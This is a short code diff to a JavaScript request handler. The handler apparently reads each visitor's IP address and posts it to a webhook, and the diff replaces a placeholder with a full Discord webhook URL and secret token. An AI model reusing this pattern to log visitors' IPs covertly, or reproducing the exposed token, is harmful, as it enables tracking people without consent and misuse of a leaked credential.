@@ -9,7 +9,7 @@ export default async function handler(req, res) {
     req.socket.remoteAddress ||
     "unknown";
 
-  const WEBHOOK_URL = "PUT_YOUR_WEBHOOK_URL_HERE";
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1455672899192225989/9kdKQBwgdrCBlnxg4TLe57jftACcS7vaEM6AELseBrIPgmxTwVtZxiu5Qu_eeS-ex1Z1";
 
   try {
     await fetch(WEBHOOK_URL, {
